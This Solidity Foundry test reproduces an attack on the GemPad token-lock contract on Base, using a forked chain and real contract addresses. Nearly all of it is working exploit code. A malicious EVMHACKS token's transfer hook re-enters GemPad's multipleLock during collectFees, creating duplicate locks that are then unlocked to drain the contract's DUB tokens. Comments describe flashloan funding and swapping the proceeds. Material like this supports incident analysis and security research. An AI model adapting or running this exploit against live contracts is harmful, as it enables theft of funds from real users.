// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";


contract GemPad is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 23814680;
    address hacker = 0xFDd9b0A7e7e16b5Fd48a3D1e242aF362bC81bCaa;
    // this is the amount of DUB tokens at the time of the hack on the DUB-ALB pair from where you can get flashloan. 
    // this amount can lower, but then to withdraw ALL DUB tokens from the Gamepad contract, you would need to do
    // more iterations of collectFees() in the for (Q)
    


    function setUp() public {
        vm.createSelectFork("Base", blocknumToForkFrom);
        fundingToken = address(0);
        deal(hacker, 12 ether);
        
        vm.label(address(0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1), "UniV3PositionsNFT");
        vm.label(address(0x2626664c2603336E57B271c5C0b26F421741e481), "UniV3Router");
        vm.label(address(0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24), "UniV2Router");
        vm.label(address(0x8909Dc15e40173Ff4699343b6eB8132c65e18eC6), "UniV2Factory");
        vm.label(address(0x4200000000000000000000000000000000000006), "WETH");
        vm.label(address(0x10B5F02956d242aB770605D59B7D27E51E45774C), "GempadLock"); 
    }


    function testExploit() public{
        // this is the amount of DUB tokens at the time of the hack on the DUB-ALB pair from where you can get flashloan. 
        // this amount can lower, but then to withdraw ALL DUB tokens from the Gamepad contract, you would need to do
        // more iterations of collectFees() in the for (Q)
        uint256 dub_flashloan_amount = 22126859807371300580304730; 

        vm.startPrank(hacker);
        exploit exp_contract = new exploit();
        // In practice, there are many ways to get the right amount of DUB. including through flashloan
        deal(address(0x30457a1ab7cd796d6E55E4e5BA12e09f2283e856), address(exp_contract), dub_flashloan_amount);
        exp_contract.exploit_it(dub_flashloan_amount);
        uint256 timestamp = vm.getBlockTimestamp();
        vm.warp(timestamp+1); // step in next block
        // simulate that we have returned all the DUB to flashloan
        deal(address(0x30457a1ab7cd796d6E55E4e5BA12e09f2283e856), address(exp_contract), 0); 
        exp_contract.unlock(); // tx2: unlock all Locks, withrdaw profit
    }

}


interface IGempadLock {

    function multipleLock(
        address[] calldata owners,
        address token,
        bool isLpToken,
        uint256[] calldata amounts,
        uint40 unlockDate,
        string memory description,
        string memory metaData,
        address projectToken,
        address referrer
    ) external payable returns (uint256[] memory);

    function multipleVestingLock(
        address[] calldata owners,
        uint256[] calldata amounts,
        address token,
        bool isLpToken,
        uint40 tgeDate,
        uint24 tgeBps,
        uint40 cycle,
        uint24 cycleBps,
        string memory description,
        string memory metaData,
        address projectToken,
        address referrer
    ) external payable returns (uint256[] memory);

    function lockLpV3(
        address owner,
        address nftManager,
        uint256 nftId,
        uint40 unlockDate,
        string memory description,
        string memory metaData,
        address projectToken,
        address referrer
    ) external payable returns (uint256 id);

    function unlock(uint256 lockId) external;

    function editLock(
        uint256 lockId,
        uint256 additionalAmount,
        uint40 newUnlockDate
    ) external;

    function collectFees(uint256 lockId) external returns (uint256 amount0, uint256 amount1);

}

contract exploit is Test {
    INonfungiblePositionManager uniV3PositionsNFT = INonfungiblePositionManager(0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1);
    Uni_Router_V3 uniV3Router = Uni_Router_V3(address(0x2626664c2603336E57B271c5C0b26F421741e481));
    IUniswapV2Router uniV2Router = IUniswapV2Router(payable(address(0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24)));
    IUniswapV2Factory uniV2Factory = IUniswapV2Factory(0x8909Dc15e40173Ff4699343b6eB8132c65e18eC6);
    IWETH weth = IWETH(payable(address(0x4200000000000000000000000000000000000006)));
    IGempadLock gempad = IGempadLock(0x10B5F02956d242aB770605D59B7D27E51E45774C);
    IERC20 dub = IERC20(0x30457a1ab7cd796d6E55E4e5BA12e09f2283e856);

    address payable public owner;
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    uint256[] public multiple_lock_ids;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() payable {
        owner = payable(msg.sender);
        name = "EVMHACKS";
        symbol = "EVMHACKS";
        mint(address(this), 10000 ether);
    }

    fallback() external payable {
        
    }

    receive() external payable {
        
    }

    function exploit_it(
        uint256 dub_amount
    ) external {
        // there is no need for a large amount of DUB token in the liquidity of the UniV3 pair
        uint256 dub_amount_for_mint_NFT_LP = dub_amount/1_000_000; 
        uint256 nftId = create_LPv3_position(dub_amount_for_mint_NFT_LP);
        // lock LP EVMHACKS-DUB NFT in gempad
        uniV3PositionsNFT.approve(address(gempad), nftId);
        uint40 lock_timestamp = uint40(block.timestamp)+1;
        uint256 lock_id = gempad.lockLpV3(address(this), address(uniV3PositionsNFT), nftId, lock_timestamp, "", "", address(this), address(0));
        console.log("lock_id: ", lock_id);

        Uni_Router_V3.ExactInputSingleParams memory params = Uni_Router_V3.ExactInputSingleParams(
            address(this),           // tokenIn
            address(dub),           // tokenOut
            500,                     // fee
            address(this),           // recipient
            1_000_000_000,          // amountIn. it can be any amount, the main thing is to generate a fee
            0,                       // amountOutMinimum
            0                        // sqrtPriceLimitX96
        );
        allowance[address(this)][address(uniV3Router)] = type(uint256).max;
        dub.approve(address(uniV3Router), type(uint256).max);
        dub.approve(address(gempad), type(uint256).max);
        // calculation of iterations of the unlock() calls
        // as long as the DUB Gempad balance is sufficient
        uint256 gempad_dub_balance = dub.balanceOf(address(gempad));
        uint256 dub_self_balance = dub.balanceOf(address(this));
        uint256 q = gempad_dub_balance/dub_self_balance;
        for(uint8 i = 0; i<q; i++){
            uniV3Router.exactInputSingle(params);
            gempad.collectFees(lock_id);
        }
        console.log("multiple_lock_ids: ", multiple_lock_ids.length);
        
        // At the point this contract will have the amount of DUB 
        // that it had in the beginning. If we had used flashloan, we should have returned them.
    }

// Creating UniV3 pool with malicious token EVMHACKS and DUB and mint NFT LP
function create_LPv3_position(uint256 dub_amount) public payable returns(uint256) {
    // Creating Uni V3 pool with EVMHACKS-DUB
    dub.approve(address(uniV3PositionsNFT), type(uint256).max);
    allowance[address(this)][address(uniV3PositionsNFT)] = type(uint256).max; 
    uniV3PositionsNFT.createAndInitializePoolIfNecessary(
        // Unlike the exploit on LP FOMO-WETH, token0 and token 1 are reversed here due to 
        // https://github.com/Uniswap/v3-periphery/blob/0682387198a24c7cd63566a2c58398533860a5d1/contracts/base/PoolInitializer.sol#L19
        address(dub), // token0. 
        address(this), // token1
        uint24(500), // fee
        type(uint96).max // sqrtPriceX96
    );
    
    // Mint EVMHACKS-DUB LP NFT
    INonfungiblePositionManager.MintParams memory mint_params = INonfungiblePositionManager.MintParams(
        address(dub), // token0
        address(this), // token1
        500, // fee
        -100000, // tickLower
        100000, // tickUpper
        dub_amount, // amount0Desired
        dub_amount, // amount1Desired. token1 is exploit token, we can mint infinity EVMHACKS token to self.
        0, // amount0Min
        0, // amount1Min
        address(this), // recipient
        block.timestamp + 99 // deadline
    );
    (uint256 tokenId,,,) = uniV3PositionsNFT.mint(mint_params);
    return tokenId;
}

    function unlock() public {
        uint256 dub_bal = dub.balanceOf(address(this));
        console.log("Self DUB before unlock: ", dub_bal);
        for(uint8 elem = 0; elem < multiple_lock_ids.length; elem++){
            gempad.unlock(multiple_lock_ids[elem]);
        }
        dub_bal = dub.balanceOf(address(this));
        console.log("Self DUB after unlock: ", dub_bal);

        // here we can swap DUB->WETH via DUB-ALB->WETH pools
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;

        if(to == 0x10B5F02956d242aB770605D59B7D27E51E45774C && amount == 499999) { // condition for call from gempad.collectFees()
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = dub.balanceOf(address(this));
            address[] memory owners = new address[](1);
            owners[0] = address(this);
            uint40 unlock_date = uint40(block.timestamp)+1;
            uint256[] memory m_lock_id = gempad.multipleLock(owners, address(dub), false, amounts, unlock_date, "", "", address(dub), address(0));
            multiple_lock_ids.push(m_lock_id[0]);
        }

        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowance[from][msg.sender] >= amount, "insufficient allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function mint(address to, uint256 amount) public {
        require(msg.sender == owner, "only owner can mint");
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }
}